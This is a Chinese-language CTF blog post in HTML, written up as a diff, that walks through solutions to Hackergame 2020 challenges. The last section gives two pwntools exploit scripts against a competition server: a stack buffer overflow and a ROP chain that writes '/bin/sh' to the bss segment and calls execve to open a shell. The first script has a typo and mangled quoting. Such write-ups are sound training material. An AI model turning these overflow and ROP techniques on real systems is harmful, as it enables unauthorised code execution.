@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Hackergame 20200x01 签到这一题很容易发现要提取整数个flag他才会给你flag，但是题目中是调不到整数个的，但是我们观察url就可以发现解题方法。  直接把number&#x3D;1，2，3等整数就行。超过一万就给不起了  0x02 猫咪问答第一个问题，，百度百度 必应必应 谷歌谷歌。 第二个问，，也是百度百度。 第三个问，去科大官网看看以前发的推送就能看到了。 第四问，百度地图实景查看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackergame2020">
+<meta property="og:url" content="http://example.com/2020/11/07/hackergame2020/index.html">
+<meta property="og:site_name" content="一个CTF小小萌新的blog">
+<meta property="og:description" content="Hackergame 20200x01 签到这一题很容易发现要提取整数个flag他才会给你flag，但是题目中是调不到整数个的，但是我们观察url就可以发现解题方法。  直接把number&#x3D;1，2，3等整数就行。超过一万就给不起了  0x02 猫咪问答第一个问题，，百度百度 必应必应 谷歌谷歌。 第二个问，，也是百度百度。 第三个问，去科大官网看看以前发的推送就能看到了。 第四问，百度地图实景查看">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/1.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/2.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/3.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/4.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/5.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/6.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/7.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/8.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/9.png">
+<meta property="og:image" content="http://example.com/2020/11/07/hackergame2020/10.png">
+<meta property="article:published_time" content="2020-11-07T01:00:25.000Z">
+<meta property="article:modified_time" content="2020-11-10T08:09:33.295Z">
+<meta property="article:author" content="royalw">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/11/07/hackergame2020/1.png">
+
+<link rel="canonical" href="http://example.com/2020/11/07/hackergame2020/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hackergame2020 | 一个CTF小小萌新的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="一个CTF小小萌新的blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">一个CTF小小萌新的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">要做最优秀的，冲冲冲</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/07/hackergame2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="royalw">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一个CTF小小萌新的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hackergame2020
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-07 09:00:25" itemprop="dateCreated datePublished" datetime="2020-11-07T09:00:25+08:00">2020-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-10 16:09:33" itemprop="dateModified" datetime="2020-11-10T16:09:33+08:00">2020-11-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Hackergame-2020"><a href="#Hackergame-2020" class="headerlink" title="Hackergame 2020"></a>Hackergame 2020</h1><h2 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h2><p>这一题很容易发现要提取整数个flag他才会给你flag，但是题目中是调不到整数个的，但是我们观察url就可以发现解题方法。</p>
+<p><img src="/2020/11/07/hackergame2020/1.png" alt="image-20201107090523191"></p>
+<p>直接把number=1，2，3等整数就行。<del>超过一万就给不起了</del></p>
+<p><img src="/2020/11/07/hackergame2020/2.png"></p>
+<h2 id="0x02-猫咪问答"><a href="#0x02-猫咪问答" class="headerlink" title="0x02 猫咪问答"></a>0x02 猫咪问答</h2><p>第一个问题，，百度百度 必应必应 谷歌谷歌。</p>
+<p>第二个问，，也是百度百度。</p>
+<p>第三个问，去科大官网看看以前发的推送就能看到了。</p>
+<p>第四问，百度地图实景查看，，(或者找科大的同学呀)</p>
+<p>第五问，同第三问。</p>
+<h2 id="0x03-2048"><a href="#0x03-2048" class="headerlink" title="0x03 2048"></a>0x03 2048</h2><p>这题直接看源代码。</p>
+<p><img src="/2020/11/07/hackergame2020/3.png"></p>
+<p>继续往下看。</p>
+<p><img src="/2020/11/07/hackergame2020/4.png"></p>
+<p>如果赢了，就把url加上getflxg那一串，后面=‘b’+’a’+ +’a’+’a’很容易猜到就是banana啊。</p>
+<p>所以直接拿到flag。</p>
+<p><img src="/2020/11/07/hackergame2020/5.png"></p>
+<h2 id="0x04-一闪而过的flag"><a href="#0x04-一闪而过的flag" class="headerlink" title="0x04 一闪而过的flag"></a>0x04 一闪而过的flag</h2><p>这个嘛，就直接把文件下载下来，放到cmd里面运行就行了。<del>（不会真的有人截图的把）</del></p>
+<h2 id="0x05-从零开始的记账工具人"><a href="#0x05-从零开始的记账工具人" class="headerlink" title="0x05 从零开始的记账工具人"></a>0x05 从零开始的记账工具人</h2><p>暴力破解，别问花了多久，问就是5个小时。</p>
+<h2 id="0x06-超简单的世界模拟器"><a href="#0x06-超简单的世界模拟器" class="headerlink" title="0x06 超简单的世界模拟器"></a>0x06 超简单的世界模拟器</h2><p>百度一下生命游戏先。看到一个图案叫轻量级飞船，没2个回合向右边走一个周期，所以直接把飞船用在题目里就拿到第一个flag了，，第二个没写出来。</p>
+<h2 id="0x07-生活在博弈树上"><a href="#0x07-生活在博弈树上" class="headerlink" title="0x07 生活在博弈树上"></a>0x07 生活在博弈树上</h2><h3 id="始终热爱大地！！！"><a href="#始终热爱大地！！！" class="headerlink" title="始终热爱大地！！！"></a>始终热爱大地！！！</h3><p>首先嘛，先checksec一下看看。</p>
+<p><img src="/2020/11/07/hackergame2020/6.png"></p>
+<p>显示有canary，还开了nx。一开始我就不知道有canary怎么做，后来知道canary是假的，调试一下就发现了 。随后再把丢到ida里面看看。反编译看看main函数的伪代码，发现关键点。然后有一个gets危险函数把字符写到v12哪里，然后看ida算出偏移量为0x89。</p>
+<p><img src="/2020/11/07/hackergame2020/7.png"></p>
+<p>只要把v15覆盖为1就能得到flag。。不过再覆盖的时候一定注意先跑完前面的if的条件不然程序出不来。。。</p>
+<p>所以脚本就是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form pwn <span class="keyword">import</span>*</span><br><span class="line">token = .....</span><br><span class="line">p = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>,<span class="number">10141</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">payload = ’(<span class="number">1</span>,<span class="number">2</span>)<span class="string">&#x27; + &#x27;</span>a<span class="string">&#x27;*0x84 + p64(0x1)</span></span><br><span class="line"><span class="string">p.recvuntil(&quot;Your turn. Input like (x,y), such as (0,1): &quot;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="升上天空！！"><a href="#升上天空！！" class="headerlink" title="升上天空！！"></a>升上天空！！</h3><p>第二题的话肯定就是要获得shell了。我当时第一思路就是系统调用，exevce(‘/bin/sh’,NULL,NULL)就能拿到shell。用ROPgadget找一找gadget。</p>
+<p><img src="/2020/11/07/hackergame2020/8.png"></p>
+<p>没有/bin/sh而且亲测/sh也都用不了。。所以我们要自己把/bin/sh写入bss段上去，调用gets函数。</p>
+<p>在ida中找到gets函数的地址，然后继续寻找需要的gadget。</p>
+<p><img src="/2020/11/07/hackergame2020/9.png"></p>
+<p><img src="/2020/11/07/hackergame2020/10.png"></p>
+<p>在找一段bss上的地址就行了。在ida上随便找一下，bss_addr=0x00000000004A9A01。</p>
+<p>之后就能构造payload了。这里要把程序跑通的话还需要把棋下输或者像第一题一样覆盖掉,我这里用1全部填充接直接过了检测了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">token = .....</span><br><span class="line">p = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>,<span class="number">10141</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">pop_rax = <span class="number">0x000000000043e52c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017b6</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000407228</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000043dbb5</span></span><br><span class="line">pop_rbx = <span class="number">0x000000000046cb55</span></span><br><span class="line">bss_addr = <span class="number">0x00000000004A9A01</span></span><br><span class="line">gets_addr = <span class="number">0x409E00</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000402bf4</span></span><br><span class="line">payload=flat([<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x98</span> , pop_rdi , bss_addr , gets_addr , pop_rdi , bss_addr , pop_rsi , <span class="number">0</span> , pop_rdx , <span class="number">0</span> , pop_rax , <span class="number">0x3b</span> , syscall_addr])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your turn. Input like (x,y), such as (0,1): &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>所以脚本就是这样的了，就能得到shell，拿到flag。</p>
+
+    </div>
+    <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/27/easyrop%E4%B8%8Deasy/" rel="prev" title="easyrop不easy">
+      <i class="fa fa-chevron-left"></i> easyrop不easy
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hackergame-2020"><span class="nav-number">1.</span> <span class="nav-text">Hackergame 2020</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 猫咪问答</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-2048"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 2048</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E4%B8%80%E9%97%AA%E8%80%8C%E8%BF%87%E7%9A%84flag"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 一闪而过的flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%B0%E8%B4%A6%E5%B7%A5%E5%85%B7%E4%BA%BA"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 从零开始的记账工具人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E8%B6%85%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%96%E7%95%8C%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 超简单的世界模拟器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%94%9F%E6%B4%BB%E5%9C%A8%E5%8D%9A%E5%BC%88%E6%A0%91%E4%B8%8A"><span class="nav-number">1.7.</span> <span class="nav-text">0x07 生活在博弈树上</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%8B%E7%BB%88%E7%83%AD%E7%88%B1%E5%A4%A7%E5%9C%B0%EF%BC%81%EF%BC%81%EF%BC%81"><span class="nav-number">1.7.1.</span> <span class="nav-text">始终热爱大地！！！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%87%E4%B8%8A%E5%A4%A9%E7%A9%BA%EF%BC%81%EF%BC%81"><span class="nav-number">1.7.2.</span> <span class="nav-text">升上天空！！</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="royalw"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">royalw</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">royalw</span>
+</div>
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+     本站访客数:<span id="busuanzi_value_site_uv"></span>
+  </span>
+  </div>
+
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
